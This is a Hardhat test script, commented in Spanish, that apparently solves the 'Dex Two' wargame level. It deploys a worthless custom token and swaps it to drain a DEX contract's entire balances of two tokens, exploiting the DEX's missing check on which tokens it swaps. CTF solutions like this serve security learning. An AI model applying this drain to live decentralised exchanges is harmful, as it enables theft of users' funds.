import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let nueveReinasToken: Contract;
let challenge: Contract;
let token1:string;
let token2:string;
let valorASwappear:number;
let cambiarColumnas:boolean = false; // Solo para mostrar mejor el console log.
const LEVEL_ADDRESS = "0x5026Ff8C97303951c255D3a7FDCd5a1d0EF4a81a";
// const INSTANCIA_DEL_NIVEL: string = "0x7026fB99FF790AAe5b1feE9f438889D76136dd0F";
const INSTANCIA_DEL_NIVEL: string = "";

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  // Contrato del challenge
  const challengeFactory = await ethers.getContractFactory(`DexTwo`);
  if (INSTANCIA_DEL_NIVEL.length > 1) {
    challenge = challengeFactory.attach(INSTANCIA_DEL_NIVEL);
    console.log(`INSTANCIA CONTRATO CHALLENGE UTILIZADA DESDE:`, challenge.address);
  }
  else {
    const challengeAddress = await createChallenge(LEVEL_ADDRESS);
    challenge = challengeFactory.attach(challengeAddress);
    console.log(`CONTRATO CHALLENGE DEPLOYADO EN:`, challenge.address);
  }
  
  // Contrato atacante (Si fuera necesario)
  const nueveReinasFactory = await ethers.getContractFactory(`TokenNueveReinas`);
  nueveReinasToken = await nueveReinasFactory.deploy();
  await nueveReinasToken.deployed();
  console.log(`CONTRATO TOKEN NUEVE REINAS DEPLOYADO EN:`, nueveReinasToken.address);

  token1 = await challenge.token1();
  token2 = await challenge.token2();
  
  console.log(`TOKEN 1: ${token1}`);
  console.log(`TOKEN 2: ${token2}`);
  
  // Primero habilito al DEX a que utilice mis 2 tokens. Para esto uso Dex.approve.
  let txApproveInicial = await challenge.approve(challenge.address, 9999);    
  await txApproveInicial.wait();
  
  //También habilito al DEX para que utilice mis tokens NueveReinas.
  let txApproveReinas = await nueveReinasToken.approve(challenge.address, 9999);
  await txApproveReinas.wait();
  
  //Doy 1 token nueve reinas al contrato del dex para manipular la parte de la división en el método getSwapAmount.
  let txMintInicial = await nueveReinasToken.mint(challenge.address,1);
  await txMintInicial.wait();

  let balanceDexNueveReinas = await nueveReinasToken.balanceOf(challenge.address)
  console.log(`EL BALANCE DEL DEX EN NUEVE REINAS ES DE: ${balanceDexNueveReinas}`);
  
  let miBalanceNueveReinas = await nueveReinasToken.balanceOf(await eoa.getAddress());
  console.log(`MI BALANCE EN NUEVE REINAS ES: ${miBalanceNueveReinas}`);
  
});

describe("Dex Two challenge", async()=> {
  it("Resuelve el challenge - Dex Two", async()=>{
    // Comprobamos estado inicial del dex y nuestra eoa
    let dexToken1Balance:number = await challenge.balanceOf(token1,challenge.address);
    let dexToken2Balance:number = await challenge.balanceOf(token2,challenge.address);
    console.log(`DEX BALANCE TOKEN 1: ${dexToken1Balance}`); //Debería ser 100
    console.log(`DEX BALANCE TOKEN 2: ${dexToken2Balance}`); //Debería ser 100
    
    let eoaToken1Balance:number = await challenge.balanceOf(token1,eoa.getAddress());
    let eoaToken2Balance:number = await challenge.balanceOf(token2,eoa.getAddress());
    console.log(`EOA BALANCE TOKEN 1: ${eoaToken1Balance}`); //Debería ser 10
    console.log(`EOA BALANCE TOKEN 2: ${eoaToken2Balance}`); //Debería ser 10

    console.log(`----------------------   COMENZANDO SWAPS   ----------------------`);
    // Amount=1 para que getSwapAmount valga 100 (balance entero que queremos vaciar).
    let txSwapToken1 = await challenge.swap(nueveReinasToken.address, token1, 1, {gasLimit:1e5}); 
    await txSwapToken1.wait();
    

    // Comprobamos balance del DEX sobre Token1.
    dexToken1Balance = await challenge.balanceOf(token1,challenge.address);
    console.log(`Balance del DEX sobre Token1: ${dexToken1Balance}`);
    
    // Como el balance del challenge sera de 2 tokens nueveReinas (1 inicial + el que le transferimos hace instantes), necesitamos Amount=2
    let txSwapToken2 = await challenge.swap(nueveReinasToken.address, token2, 2, {gasLimit:1e5}); 
    await txSwapToken2.wait();
    

    // Comprobamos balance del DEX sobre Token2.
    dexToken1Balance = await challenge.balanceOf(token1,challenge.address);
    console.log(`Balance del DEX sobre Token1: ${dexToken1Balance}`);

    console.log(`----------------------   FIN DE SWAPS   ----------------------`);
  })
});

after(async () => {
  expect(await submitLevel(challenge.address), "DESAFÍO INCOMPLETO").to.be.true;
});